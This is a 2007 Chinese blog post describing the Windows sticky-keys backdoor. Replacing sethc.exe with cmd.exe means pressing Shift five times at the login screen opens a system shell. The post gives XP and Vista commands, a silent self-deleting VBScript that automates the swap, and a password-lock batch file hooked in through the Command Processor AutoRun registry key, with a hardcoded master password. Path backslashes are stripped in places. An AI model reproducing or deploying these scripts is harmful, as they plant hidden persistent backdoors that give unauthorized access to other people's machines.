---
title: 2000/xp/vista下5次shift的粘滞键利用
description:      这篇文章里说的方法和欠钱前2天说的用explorer.exe替换sethc.exe然后在3389下用5次shift获得资源管理器的方法差不多，不过做了一些扩展，蛮有意思~
date: 2007-10-06 12:44:21
category: 技术文章
tags: ['技术类', '安全', '技巧', 'Windows']
post_id: 190
alias: 5Shift-sethc
ViewNums: 7023
---

这篇文章里说的方法和欠钱前2天说的用explorer.exe替换sethc.exe然后在3389下用5次shift获得资源管理器的方法差不多，不过做了一些扩展，蛮有意思~

在windows 2000/xp/vista下，按shift键5次，可以打开粘置，会运行sethc.exe，而且，在登录界面里也可以打开。这就让人联想到WINDOWS的屏保，将程序替换成cmd.exe后，就可以打开shell了。

　　XP：
```
| 将安装源光盘弹出（或将硬盘上的安装目录改名)  cd %widnir%system32dllcache  ren sethc.exe *.ex~  cd %widnir%system32  copy /y cmd.exe sethc.exe |
| --- |
```
VISTA：
```
| takeown /f c:windowssystem32sethc.exe  cacls c:windowssystem32sethc.exe /G administrator:F  然后按XP方法替换文件 |
| --- |
```
在登录界面按5此SHIFT，出来cmd shell，然后……

后门扩展：

转至：7j blog http://1v1.name/show-241-1.html#cm300

再更新一下
```
| Dim obj, success  Set obj = CreateObject("WScript.Shell")  success = obj.run("cmd /c takeown /f %SystemRoot%system32sethc.exe", 0, True)  success = obj.run("cmd /c echo y| cacls %SystemRoot%system32sethc.exe /G %USERNAME%:F", 0, True)  success = obj.run("cmd /c copy %SystemRoot%system32cmd.exe %SystemRoot%system32acmd.exe", 0, True)  success = obj.run("cmd /c copy %SystemRoot%system32sethc.exe %SystemRoot%system32asethc.exe", 0, True)  success = obj.run("cmd /c del %SystemRoot%system32sethc.exe", 0, True)  success = obj.run("cmd /c ren %SystemRoot%system32acmd.exe sethc.exe", 0, True) |
| --- |
```
第二句最有意思了.嘿嘿..自动应答....以前就遇到过类似的问题

再更新.加个自删除,简化代码...

| On Error Resume Next  Dim obj, success  Set obj = CreateObject("WScript.Shell")  success = obj.run("cmd /c takeown /f %SystemRoot%system32sethc.exe&echo y| cacls %SystemRoot%system32sethc.exe /G %USERNAME%:F&copy %SystemRoot%system32cmd.exe %SystemRoot%system32acmd.exe&copy %SystemRoot%system32sethc.exe %SystemRoot%system32asethc.exe&del %SystemRoot%system32sethc.exe&ren %SystemRoot%system32acmd.exe sethc.exe", 0, True)  CreateObject("Scripting.FileSystemObject").DeleteFile(WScript.ScriptName) |
| --- |

后门锁扩展：

allyesno注：可以采用cmd 锁 来进行cmdshell的密码验证 嘿嘿。。。

用下面的后门锁的方法是 把代码保存为bdlock.bat

然后修改注册表位置即可
```reg
[HKEY_LOCAL_MACHINESOFTWAREMicrosoftCommand Processor]
　　"AutoRun"="bdlock.bat"

| @Echo Off  title 后门登陆验证  color a  cls  set temprandom=%RANDOM%  echo 请输入验证码:%temprandom%  set/p check=  if "%check%"=="%temprandom%%temprandom%" goto passcheck  if "%check%"=="%temprandom%" (  rem 后门服务器验证  rem 如果没有后门验证服务器请rem注释掉下一行代码  if exist 192.168.8.8ackdoor$pass goto passcheck  )  echo 验证失败  pause  exit  :passcheck  echo 验证成功  If "%passcmdlock%"=="aaa" Goto endx  Set passcmdlock=aaa :allyesno  Set Errorlevel=>nul  Echo 请输入验证密码？  Set password=allyesno Is a pig>nul  Set/p password=  rem 万能密码  if "%password%"=="allyesno is a sb" goto endx  If %time:~1,1%==0 Set timechange=a  If %time:~1,1%==1 Set timechange=b  If %time:~1,1%==2 Set timechange=c  If %time:~1,1%==3 Set timechange=d  If %time:~1,1%==4 Set timechange=e  If %time:~1,1%==5 Set timechange=f  If %time:~1,1%==6 Set timechange=g  If %time:~1,1%==7 Set timechange=h  If %time:~1,1%==8 Set timechange=i  If %time:~1,1%==9 Set timechange=j  set/a sum=%time:~1,1%+%time:~1,1%  Set password|findstr "^password=%timechange%%time:~1,1%%date:~8,2%%sum%$">nul  If "%errorlevel%"=="0" cls&Echo 口令正确&Goto End  Echo 请联系瑞星客服咨询正确密码！&Goto allyesno  :End  Set password=>nul  Set Errorlevel=>nul  Echo 很好，很和谐！  :endx |
| --- |
```
代码只是一个示例，请大家谨慎测试。